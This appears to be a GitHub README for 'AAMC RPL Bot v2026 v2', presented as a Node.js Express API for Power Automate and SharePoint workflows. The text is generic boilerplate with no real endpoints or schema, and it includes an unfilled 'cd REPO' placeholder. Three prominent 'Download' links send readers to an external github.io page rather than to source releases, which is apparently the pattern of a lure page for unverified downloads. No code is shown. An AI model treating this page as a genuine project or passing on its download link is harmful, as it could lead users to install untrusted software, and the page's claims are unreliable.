# AAMC RPL Bot v2026 v2 - automation API utility 2026

> **AAMC RPL Bot v2026 v2** is a Node.js Express API utility hosted on Azure. It supports Power Automate and SharePoint-oriented automation by receiving RPL requests through a protected endpoint and processing structured JSON data.

[![Platform](https://img.shields.io/badge/Platform-Azure%20Web%20App%20%2F%20Node.js%20Express-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026%20v2-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/parkerfelixhofz6432/aamc-rpl-bot-api-2026?style=flat-square)](https://github.com/parkerfelixhofz6432/aamc-rpl-bot-api-2026)

---

<p align="center">
  <a href="https://parkerfelixhofz6432.github.io/aamc-rpl-bot-api-2026/">
    <img src="https://img.shields.io/badge/Download-AAMC%20RPL%20Bot%20Latest-brightgreen?style=for-the-badge" alt="Download AAMC RPL Bot">
  </a>
</p>

> **[Download AAMC RPL Bot v2026 v2](https://parkerfelixhofz6432.github.io/aamc-rpl-bot-api-2026/)**

---

[Download Latest Build](https://parkerfelixhofz6432.github.io/aamc-rpl-bot-api-2026/)

---

## Overview

AAMC RPL Bot provides a controlled API boundary for automation systems that exchange RPL prompts and responses. Its Azure Web App and Node.js Express compatibility makes it a practical fit for workflows built around Power Automate, JSON request bodies, and predictable HTTP responses.

The service is intended for scenarios where incoming requests must pass through an authenticated endpoint before being returned in a format that other systems can process. OpenAPI documentation and Parse JSON support also make the utility suitable for wider integrations involving SharePoint and API-based workflow orchestration.

---

## Capabilities

- Authenticated POST endpoint for managed request processing
- Request and response formats suited to Power Automate
- Support for API key and bearer token authentication
- Administrative page for service configuration
- localStorage persistence for stored preferences
- OpenAPI document support for describing and integrating the API
- Parse JSON schema support for workflow payload processing
- Express-based service designed for Azure Web App hosting

---

## Getting Started

Download or clone the repository and install its Node.js packages from the project directory:

    git clone https://github.com/parkerfelixhofz6432/aamc-rpl-bot-api-2026.git
    cd REPO
    npm install

Launch the Express application with the Node.js command used by your environment:

    npm start

After startup, access the application through its Azure Web App address or the endpoint provided by your local development setup. For Azure deployments, set the required application settings before publishing.

---

## Working with the API

The protected API can be called from a Power Automate flow or another HTTP client capable of submitting JSON. A standard request uses POST, supplies the configured authentication value, and places the workflow data in the JSON body.

A typical automation sequence looks like this:

1. Prepare the RPL request data in Power Automate.
2. Submit the data as JSON to the Express endpoint.
3. Authenticate with an API key or bearer token.
4. Consume the JSON response in the following flow action.
5. Send the returned values to SharePoint or another target system.

The OpenAPI document can be used to describe the service or provide its schema to compatible API tools.

---

## Settings

The administration page and the application's localStorage-backed preferences handle configurable options, while deployment-level values are supplied by the server environment.

Configuration example:

    {
      "authMode": "apiKey",
      "apiKey": "YOUR_KEY_HERE",
      "bearerToken": "YOUR_TOKEN_HERE",
      "openApiEnabled": true,
      "parseJsonEnabled": true
    }

For environment-specific secrets and deployment values, prefer Azure app settings or environment variables where available. Use the admin page for options that should remain editable at runtime.

---

## Requirements

- Azure Web App or another hosting service compatible with Node.js
- Node.js runtime for running the Express application
- Power Automate access when the service is used inside flows
- A client or connector that can send and receive JSON
- Optional SharePoint connection for downstream workflow automation

---

## Frequently Asked Questions

**How can I use the API in Power Automate?**  
Add an HTTP action that targets the endpoint, send the required JSON structure, and provide the configured API key or bearer token.

**Where are the application settings managed?**  
Change runtime options through the admin configuration page. Azure deployment values can be updated through the environment settings.

**Can the API be documented with OpenAPI?**  
Yes. OpenAPI document support is included for schema-based documentation and integration with compatible tooling.

**Why does the response not match my flow's expected format?**  
Review the Parse JSON schema and update the flow's field mappings to reflect the fields returned by the service.

**What should I check when the application does not start?**  
Verify the installed Node.js version, confirm that dependencies were installed successfully, and inspect Azure app logs for deployment or runtime errors.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
